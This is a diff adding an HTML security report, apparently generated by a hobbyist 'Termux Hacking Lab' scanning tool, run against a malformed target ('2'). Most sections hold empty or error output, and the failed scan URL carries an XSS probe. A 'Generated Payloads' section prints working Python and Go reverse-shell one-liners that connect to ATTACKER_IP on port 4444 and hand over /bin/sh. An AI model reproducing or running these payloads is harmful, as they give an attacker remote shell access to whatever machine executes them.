@@ -1,0 +1,65 @@
+
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <title>Ultimate Security Report - 2</title>
+    <style>
+        body { font-family: 'Inter', sans-serif; background: #0b0e14; color: #e6edf3; padding: 40px; }
+        .card { background: #161b22; border: 1px solid #30363d; border-radius: 12px; padding: 25px; margin-bottom: 25px; box-shadow: 0 8px 24px rgba(0,0,0,0.5); }
+        h1 { color: #58a6ff; text-align: center; font-size: 2.5em; }
+        h2 { color: #f0883e; border-left: 4px solid #f0883e; padding-left: 15px; margin-bottom: 20px; }
+        pre { background: #0d1117; padding: 15px; border-radius: 8px; border: 1px solid #30363d; color: #7ee787; overflow-x: auto; }
+        .tech-box { background: #0d1117; padding: 20px; border-radius: 8px; border: 1px solid #30363d; }
+        .footer { text-align: center; color: #8b949e; font-size: 0.9em; margin-top: 50px; }
+    </style>
+</head>
+<body>
+    <h1>Ultimate Security Report</h1>
+    <div style="text-align:center; margin-bottom:40px;">Target: <strong>2</strong> | Time: 2026-06-01 02:14:55</div>
+
+    <div class="card">
+        <h2>1. Technology Stack (Languages)</h2>
+        <div class="tech-box">
+            <div style="display:flex; height:20px; width:100%; border-radius:10px; overflow:hidden; margin:10px 0;"><div style="width:100%; background-color:#f06529;"></div></div>
+            <div style="display:flex; flex-wrap:wrap; gap:15px; margin-top:10px;"><div><span style="display:inline-block; width:12px; height:12px; background:#f06529; border-radius:50%; margin-right:5px;"></span> HTML 100%</div></div>
+            <div style="margin-top:20px;">
+                <strong>Server:</strong> Unknown<br>
+                <strong>Framework:</strong> Unknown<br>
+                <strong>CMS:</strong> None Detected
+            </div>
+        </div>
+    </div>
+
+    <div class="card">
+        <h2>2. Information Gathering</h2>
+        <h3>DNS & Geolocation</h3>
+        <pre>{
+    "DNS": {
+        "IP Address": "2"
+    },
+    "Geo": "IP \uc704\uce58 \uc815\ubcf4\ub97c \ucc3e\uc744 \uc218 \uc5c6\uc2b5\ub2c8\ub2e4."
+}</pre>
+        <h3>Subdomains</h3>
+        <pre>"\uc11c\ube0c\ub3c4\uba54\uc778 \uc5c6\uc74c"</pre>
+    </div>
+
+    <div class="card">
+        <h2>3. Vulnerability Analysis</h2>
+        <h3>Web Security Scan</h3>
+        <pre>스캔 오류: Invalid URL '2?q=%3Cscript%3Ealert%281%29%3C/script%3E': No scheme supplied. Perhaps you meant https://2?q=%3Cscript%3Ealert%281%29%3C/script%3E?</pre>
+        <h3>Security Headers</h3>
+        <pre>"\ubcf4\uc548 \ud5e4\ub354 \uccb4\ud06c \uc2e4\ud328: Invalid URL '2': No scheme supplied. Perhaps you meant https://2?"</pre>
+    </div>
+
+    <div class="card">
+        <h2>4. Generated Payloads (Examples)</h2>
+        <h3>Python Reverse Shell</h3>
+        <pre>python -c 'import socket,os,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</pre>
+        <h3>Go Reverse Shell</h3>
+        <pre>echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","ATTACKER_IP:4444");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > r.go && go run r.go</pre>
+    </div>
+
+    <div class="footer">Framework by Termux Hacking Lab</div>
+</body>
+</html>
